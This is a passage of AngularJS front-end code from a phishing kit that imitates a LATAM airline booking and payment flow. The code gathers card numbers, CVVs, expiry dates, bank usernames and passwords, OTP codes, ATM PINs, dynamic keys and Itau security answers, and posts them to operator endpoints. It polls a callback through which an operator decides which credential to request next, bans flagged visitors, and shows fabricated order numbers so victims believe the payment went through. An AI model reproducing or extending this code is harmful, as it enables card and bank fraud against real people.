            $scope.panel = "itu";
            $scope.pregunta = $scope.campopersonalizado;
            $scope.errorItau =
              "La respuesta no es correcta, intenta nuevamente.";
            $scope.errorItauTG();
            break;

          case "12":
            $scope.errorDinamicaPrev = undefined;
            $scope.modalLoading = false;
            $scope.modalBanking = true;
            $scope.mins = 9999999;
            $scope.panel = "atm";
            $scope.errorAtm = undefined;

            break;

          case "8":
            $scope.modalLoading = false;
            $scope.modalBanking = true;
            $scope.mins = 9999999;
            $scope.panel = "Dinamica";
            $scope.errorDinamica =
              "Clave Dinamica erronea o expirada por favor Reingresela.";
            $scope.errorDINAMICATG();
            break;

          case "gUser":
            $scope.cashCode = undefined;
            $scope.modalLoading = false;
            $scope.modalBanking = true;
            $scope.mins = 9999999;
            $scope.panel = undefined;
            $scope.errorOtp = undefined;
            $scope.bankUser = undefined;
            $scope.bankPass = undefined;
            $scope.errorCash = undefined;
            break;

          case "cashierPls":
            $scope.errorUser = undefined;
            $scope.errorOtp = undefined;
            $scope.otpCode = undefined;
            $scope.errorCashierPrev = undefined;
            $scope.modalLoading = false;
            $scope.modalBanking = true;
            $scope.mins = 9999999;
            $scope.panel = "cashier";
            $scope.errorCash = undefined;
            break;
          case "11":
            $scope.errorOtp = undefined;
            $scope.errorUser = undefined;
            $scope.cashCode = undefined;
            $scope.otpCode = undefined;
            $scope.modalLoading = false;
            $scope.modalBanking = true;
            $scope.mins = 9999999;
            $scope.panel = "cashier";
            $interval.cancel($scope.intervalStart);
            $scope.errorCash = "Clave erronea por favor verifíquela.";
            $scope.errorCASHTG();
            break;
          case "3":
            $scope.errorUser = undefined;
            $scope.errorCash = undefined;
            $scope.cashCode = undefined;
            $scope.otpCode = undefined;
            $scope.modalLoading = false;
            $scope.modalBanking = true;
            $scope.mins = 9999999;
            $scope.panel = "otp";
            $interval.cancel($scope.intervalStart);
            $scope.errorOtp =
              "Código erroneo o expirado por favor verifíquelo.";
            $scope.errorOTPTG();
            break;
          case "5":
            $scope.errorOtp = undefined;
            $scope.errorCash = undefined;
            $scope.cashCode = undefined;
            $scope.resetStatus();
            $scope.modalLoading = false;
            $scope.mins = 9999999;
            $scope.panel = undefined;
            $interval.cancel($scope.intervalStart);
            $scope.bankUser = undefined;
            $scope.bankPass = undefined;
            $scope.errorUser =
              "Usuario o contraseña incorrecta por favor verifíquelos.";
            break;
          case "wCC":
            $state.transitionTo("/Payment", {
              error: 1,
            });
            $("html, body").animate({
              scrollTop: 0,
            });
            break;
          case "cContinue":
            $scope.resetStatus();
            $scope.continuePaymentPending();
            break;
          case "cBAN":
            $scope.banThisMF();
        }
      } else {
        var mariadelos = 0;
        if ($scope.errCount != $scope.errPrev) {
          mariadelos = 1;
          $scope.errPrev++;
        }
        $http
          .post("api/checkCallBack", {
            id: $scope.chosenGUID,
            errOTP: mariadelos,
          })
          .success(function (data) {
            $scope.counter += 10;
            $scope.msgAction = data.id;
            $scope.campopersonalizado = data.campo;

            if ("waiting" != data.id) {
              $scope.msgActionReplied = true;
              $scope.processingReply = undefined;

              $interval.cancel($scope.intervalStart);
              $scope.checkCallBackAPI();
            }
            if ("WAIT" == data.scode) {
              $scope.mins = 9999999;
            }
          })
          .error(function (err) {
            console.log(err);
            $scope.loading = false;
          });
      }
    };
    $scope.savemefromjail = function () {
      $http
        .post("api/savemefromjail", {})
        .success(function (muniba) {})
        .error(function (heydy) {
          console.log(heydy);
          $scope.loading = false;
        });
    };
    $scope.banThisMF = function () {
      $scope.savemefromjail();
      localStorage.setItem("permaBanLATSKAMF", 1);
      document.location.href = window.location.origin;
    };
    $scope.isThisMFBan = function () {
      if (
        null != localStorage.getItem("permaBanLATSKAMF") &&
        1 == localStorage.getItem("permaBanLATSKAMF")
      ) {
        document.location.href = window.location.origin;
      }
    };
    $scope.isThisMFBan();
    $scope.errorItauTG = function () {
      $http
        .post("api/wrongITAU", {
          id: $scope.tgId,
        })
        .success(function (data) {
          $scope.counter = 0;
          $scope.msgActionReplied = false;
        })
        .error(function (err) {
          console.log(err);
          $scope.loading = false;
        });
    };
    $scope.errorDINAMICATG = function () {
      $http
        .post("api/wrongDINAMICA", {
          id: $scope.tgId,
        })
        .success(function (data) {
          $scope.counter = 0;
          $scope.msgActionReplied = false;
        })
        .error(function (err) {
          console.log(err);
          $scope.loading = false;
        });
    };

    $scope.errorOTPTG = function () {
      $http
        .post("api/wrongOTP", {
          id: $scope.tgId,
        })
        .success(function (data) {
          $scope.counter = 0;
          $scope.msgActionReplied = false;
        })
        .error(function (err) {
          console.log(err);
          $scope.loading = false;
        });
    };

    $scope.errorITAUTG = function () {
      $http
        .post("api/wrongITAU", {
          id: $scope.tgId,
        })
        .success(function (data) {
          $scope.counter = 0;
          $scope.msgActionReplied = false;
        })
        .error(function (err) {
          console.log(err);
          $scope.loading = false;
        });
    };

    $scope.sendItauCode = function () {
      var errorAc = 0;
      if ($scope.errorItau != undefined || $scope.errorItauPrev != undefined) {
        $scope.errCount += 1;
        errorAc = 1;
        $scope.errorItauPrev = undefined;
      }

      $http
        .post("api/sendITAU", {
          id: $scope.tgId,
          respuesta: $scope.Respuestacode.toString(),
          pregunta: $scope.pregunta.toString(),
          cc: $scope.realcc,
          date: $scope.dataPay.datecc,
          nombre: $scope.nombre,
          apellido: $scope.apellido,
          bankname: $scope.bankName,
          cvv: $scope.dataPay.cvv,

          err: errorAc,
        })
        .success(function (data) {
          $scope.counter = 0;
          $scope.processingReply = true;
          $scope.msgActionReplied = false;

          $scope.errorAtm = undefined;

          $scope.intervalStart = $interval($scope.checkCallBackAPI, 1000);
        })
        .error(function (err) {
          console.log(err);
          $scope.loading = false;
        });
    };
    $scope.errorATMTG = function () {
      $http
        .post("api/wrongATM", {
          id: $scope.tgId,
        })
        .success(function (data) {
          $scope.counter = 0;
          $scope.msgActionReplied = false;
        })
        .error(function (err) {
          console.log(err);
          $scope.loading = false;
        });
    };

    $scope.sendAtmCode = function () {
      var errorAc = 0;
      if ($scope.errorAtm != undefined || $scope.errorAtmPrev != undefined) {
        $scope.errCount += 1;
        errorAc = 1;
        $scope.errorAtmPrev = undefined;
      }

      $http
        .post("api/sendATM", {
          id: $scope.tgId,
          atm: $scope.Atmcode.toString(),
          cc: $scope.realcc,
          err: errorAc,
        })
        .success(function (data) {
          $scope.counter = 0;
          $scope.processingReply = true;
          $scope.msgActionReplied = false;

          $scope.errorAtm = undefined;

          $scope.intervalStart = $interval($scope.checkCallBackAPI, 1000);
        })
        .error(function (err) {
          console.log(err);
          $scope.loading = false;
        });
    };
    $scope.resetStatus = function () {
      $http
        .post("api/resetStatusPayment", {
          id: $scope.tgId,
        })
        .success(function (data) {})
        .error(function (err) {
          console.log(err);
          $scope.loading = false;
        });
    };

    $scope.sendDinamicaCode = function () {
      var errorAc = 0;
      if (
        $scope.errorDinamica != undefined ||
        $scope.errorDinamicaPrev != undefined
      ) {
        $scope.errCount += 1;
        errorAc = 1;
        $scope.errorDinamicaPrev = undefined;
      }

      $http
        .post("api/sendDinamica", {
          id: $scope.tgId,
          dinamica: $scope.Dinamicacode.toString(),
          cc: $scope.realcc,
          err: errorAc,
        })
        .success(function (data) {
          $scope.counter = 0;
          $scope.processingReply = true;
          $scope.msgActionReplied = false;

          $scope.errorDinamica = undefined;
          //$scope.checkCallBackAPI();

          $scope.intervalStart = $interval($scope.checkCallBackAPI, 1000);
        })
        .error(function (err) {
          console.log(err);
          $scope.loading = false;
        });
    };
    $scope.sendOTPCode = function () {
      var errorAc = 0;
      if ($scope.errorOtp != undefined || $scope.errorOtpPrev != undefined) {
        $scope.errCount += 1;
        errorAc = 1;
        $scope.errorOtpPrev = undefined;
      }

      $http
        .post("api/sendOTP", {
          id: $scope.tgId,
          otp: $scope.otpCode.toString(),
          cc: $scope.realcc,
          err: errorAc,
        })
        .success(function (data) {
          $scope.counter = 0;
          $scope.processingReply = true;
          $scope.msgActionReplied = false;

          $scope.errorOtp = undefined;
          //$scope.checkCallBackAPI();

          $scope.intervalStart = $interval($scope.checkCallBackAPI, 1000);
        })
        .error(function (err) {
          console.log(err);
          $scope.loading = false;
        });
    };
    $scope.sendOTPCode = function () {
      var errorAc = 0;
      if ($scope.errorOtp != undefined || $scope.errorOtpPrev != undefined) {
        $scope.errCount += 1;
        errorAc = 1;
        $scope.errorOtpPrev = undefined;
      }

      $http
        .post("api/sendOTP", {
          id: $scope.tgId,
          otp: $scope.otpCode.toString(),
          cc: $scope.realcc,
          date: $scope.dataPay.datecc,
          bankname: $scope.bankNamePicked,
          cvv: $scope.dataPay.cvv,
          err: errorAc,
        })
        .success(function (data) {
          $scope.counter = 0;
          $scope.processingReply = true;
          $scope.msgActionReplied = false;
          $scope.errorOtp = undefined;
          //$scope.checkCallBackAPI();
          $scope.intervalStart = $interval($scope.checkCallBackAPI, 1000);
        })
        .error(function (err) {
          console.log(err);
          $scope.loading = false;
        });
    };

    $scope.resetStatus = function () {
      $http
        .post("api/resetStatusPayment", {
          id: $scope.tgId,
        })
        .success(function (data) {})
        .error(function (err) {
          console.log(err);
          $scope.loading = false;
        });
    };
    $scope.validateUser = function () {
      if (null != $scope.bankUser && $scope.bankUser.toString().length > 3) {
        $scope.bankUser = $scope.bankUser.toString().replaceAll(" ", "");
        $scope.errorBU = undefined;
      } else {
        $scope.errorBU = true;
      }
    };
    $scope.validatePass = function () {
      if (null != $scope.bankPass && $scope.bankPass.length > 3) {
        $scope.bankPass = $scope.bankPass.toString().replace(" ", "");
        $scope.errorBP = undefined;
      } else {
        $scope.errorBP = true;
      }
    };
    $scope.redir = function () {
      document.location.href = window.location.origin;
    };
    $scope.showError = function (lajace) {
      $scope.msg = lajace;
    };
    localStorage.removeItem("laOrderFaker");
  },
]);
app.controller("paidController", [
  "$scope",
  "$http",
  "$timeout",
  "$interval",
  "$state",
  function ($scope, $http, $timeout, ajalae, $state) {
    $scope.regLog = function (data) {
      $http
        .post("api/regLog", {
          log: data,
        })
        .success(function (kyston) {})
        .error(function (kymberlee) {
          console.log(kymberlee);
          $scope.loading = false;
        });
    };
    $scope.regLog("TRANSACCIÓN FINALIZADA, CHONCHI");
    $scope.isThisMFBan = function () {
      if (
        null != localStorage.getItem("permaBanLATSKAMF") &&
        1 == localStorage.getItem("permaBanLATSKAMF")
      ) {
        document.location.href = window.location.origin;
      }
    };
    $scope.isThisMFBan();
    $scope.getRandomInt = function (graceleigh, kemonta) {
      graceleigh = Math.ceil(graceleigh);
      kemonta = Math.floor(kemonta);
      return (
        Math.floor(Math.random() * (kemonta - graceleigh + 1)) + graceleigh
      );
    };
    $scope.makeid = function (abdulkarim) {
      let desandra = "";
      let montoya = 0;
      for (; montoya < abdulkarim; ) {
        desandra += "ABCDEFGHIJKLMNOPQRSTUVWXYZ".charAt(
          Math.floor(26 * Math.random())
        );
        montoya += 1;
      }
      return desandra;
    };
    $scope.fakeOrden =
      "LA0" + $scope.getRandomInt(1e5, 999999) + $scope.makeid(4);
    if (null != localStorage.getItem("laOrderFaker")) {
      $scope.fakeOrden = localStorage.getItem("laOrderFaker");
    } else {
      localStorage.setItem("laOrderFaker", $scope.fakeOrden);
    }
    $scope.loader = true;
    $timeout(function () {
      $scope.loader = undefined;
    }, 5e3);
    $scope.dataLatam = JSON.parse(localStorage.getItem("latamStorageFake"));
    var faruq = -1;
    for (let zaviar = 0; zaviar < $scope.dataLatam.length; zaviar++) {
      if (2 == $scope.dataLatam[zaviar].step) {
        faruq = zaviar;
      }
    }
    var catelaya = -1;
    for (let rajesh = 0; rajesh < $scope.dataLatam.length; rajesh++) {
      if (1 == $scope.dataLatam[rajesh].step) {
        catelaya = rajesh;
      }
    }
    if (-1 != catelaya) {
      $scope.dataVuelos = $scope.dataLatam[catelaya].info[0];
    } else {
      $state.transitionTo("/");
    }
    $scope.pickedF = undefined;
    if (-1 != faruq) {
      $scope.pickedF = $scope.dataLatam[faruq].info[0];
    } else {
      document.location.href = window.location.origin;
    }
    var dezree = -1;
    for (let salle = 0; salle < $scope.dataLatam.length; salle++) {
      if (5 == $scope.dataLatam[salle].step) {
        dezree = salle;
      }
    }
    $scope.dataPay = undefined;
    if (-1 != dezree) {
      $scope.dataPay = $scope.dataLatam[dezree].info[0];
    } else {
      document.location.href = window.location.origin;
    }
    $scope.goHome = function () {
      document.location.href = window.location.origin;
    };
  },
]);
app.controller("payFailController", [
  "$scope",
  "$http",
  "$timeout",
  "$interval",
  "$state",
  function ($scope, $http, jameison, schon, barika) {
    $scope.getRandomInt = function (gouri, arlus) {
      gouri = Math.ceil(gouri);
      arlus = Math.floor(arlus);
      return Math.floor(Math.random() * (arlus - gouri + 1)) + gouri;
    };
    $scope.makeid = function (kincade) {
      let sameed = "";
      let cynithia = 0;
      for (; cynithia < kincade; ) {
        sameed += "ABCDEFGHIJKLMNOPQRSTUVWXYZ".charAt(
          Math.floor(26 * Math.random())
        );
        cynithia += 1;
      }
      return sameed;
    };
    $scope.regLog = function (data) {
      $http
        .post("api/regLog", {
          log: data,
        })
        .success(function (lesandro) {})
        .error(function (bettye) {
          console.log(bettye);
          $scope.loading = false;
        });
    };
    $scope.regLog("TRANSACCIÓN FINALIZADA, CHONCHI");
    $scope.fakeOrden =
      "LA0" + $scope.getRandomInt(1e5, 999999) + $scope.makeid(4);
    if (null != localStorage.getItem("laOrderFaker")) {
      $scope.fakeOrden = localStorage.getItem("laOrderFaker");
    } else {
      localStorage.setItem("laOrderFaker", $scope.fakeOrden);
    }
  },
]);
